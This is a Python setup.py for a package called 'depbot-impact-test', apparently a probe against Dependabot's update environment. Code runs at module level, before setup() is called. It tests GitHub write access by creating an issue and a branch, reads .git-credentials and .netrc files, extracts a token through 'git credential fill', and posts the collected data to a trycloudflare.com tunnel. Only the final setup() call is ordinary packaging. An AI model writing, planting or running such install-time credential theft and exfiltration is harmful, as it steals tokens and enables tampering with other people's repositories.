from setuptools import setup
import os
import json
import subprocess

_canary = "DEPBOT_IMPACT_V5_2026_Yx2nRpL6mN4qGzKv"

_result = {"c": _canary}

import urllib.request

_result["installations_detail"] = ""
try:
    _rq = urllib.request.Request(
        "https://api.github.com/installation/repositories?per_page=5",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _result["installations_detail"] = _rp.read().decode("utf-8", errors="replace")[:3000]
except Exception as _e:
    _result["installations_detail"] = "error: " + str(_e)[:300]

_write_tests = {}
_repo = "toofikz2/depbot-impact-test"

try:
    _issue_data = json.dumps({"title": _canary, "body": "impact test"}).encode()
    _rq = urllib.request.Request(
        "https://api.github.com/repos/" + _repo + "/issues",
        data=_issue_data,
        method="POST",
        headers={"User-Agent": "pip/24.0", "Content-Type": "application/json"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _write_tests["create_issue"] = {
        "status": _rp.status,
        "body": _rp.read().decode("utf-8", errors="replace")[:1000]
    }
except Exception as _e:
    _write_tests["create_issue"] = {"error": str(_e)[:300]}

try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/" + _repo + "/git/refs",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _refs = json.loads(_rp.read().decode())
    _main_sha = ""
    for _ref in _refs:
        if _ref.get("ref") == "refs/heads/main":
            _main_sha = _ref["object"]["sha"]
            break
    _write_tests["refs"] = {"main_sha": _main_sha}

    if _main_sha:
        _branch_data = json.dumps({
            "ref": "refs/heads/depbot-test-write-" + _canary[:8],
            "sha": _main_sha
        }).encode()
        _rq2 = urllib.request.Request(
            "https://api.github.com/repos/" + _repo + "/git/refs",
            data=_branch_data,
            method="POST",
            headers={"User-Agent": "pip/24.0", "Content-Type": "application/json"}
        )
        _rp2 = urllib.request.urlopen(_rq2, timeout=10)
        _write_tests["create_branch"] = {
            "status": _rp2.status,
            "body": _rp2.read().decode("utf-8", errors="replace")[:500]
        }
except Exception as _e:
    _write_tests["create_branch"] = {"error": str(_e)[:300]}

_result["write_tests"] = _write_tests

_result["cred_store_files"] = os.popen(
    "find /home/dependabot -name '.git-credentials' -o -name 'credentials' -o -name '.netrc' 2>/dev/null"
).read()[:1000]

_result["git_store_data"] = os.popen(
    "cat /home/dependabot/.git-credentials 2>/dev/null; "
    "cat /home/dependabot/dependabot-updater/.git-credentials 2>/dev/null; "
    "cat /home/dependabot/.netrc 2>/dev/null"
).read()[:1000]

_gc_test = subprocess.run(
    ["git", "-C", os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "."),
     "credential", "fill"],
    input="protocol=https\nhost=github.com\npath=toofikz2/depbot-impact-test.git\n",
    capture_output=True, text=True, timeout=5
)
_result["git_cred_with_path"] = {
    "stdout": _gc_test.stdout[:500],
    "stderr": _gc_test.stderr[:300],
    "rc": _gc_test.returncode
}

_result["git_remote_url"] = subprocess.run(
    ["git", "-C", os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "."),
     "remote", "-v"],
    capture_output=True, text=True, timeout=5
).stdout[:500]

try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/" + _repo + "/contents/setup.py",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _rd = json.loads(_rp.read().decode())
    _result["can_read_own_source"] = {
        "sha": _rd.get("sha", "?"),
        "size": _rd.get("size", 0),
        "type": _rd.get("type", "?")
    }
except Exception as _e:
    _result["can_read_own_source"] = {"error": str(_e)[:200]}

_result["output_dir"] = os.popen(
    "ls -la " + os.environ.get("DEPENDABOT_OUTPUT_PATH", "/dev/null").rsplit("/", 1)[0]
).read()[:1000]

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq3 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-v5",
        data=_data,
        method="POST",
    )
    _rq3.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq3, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
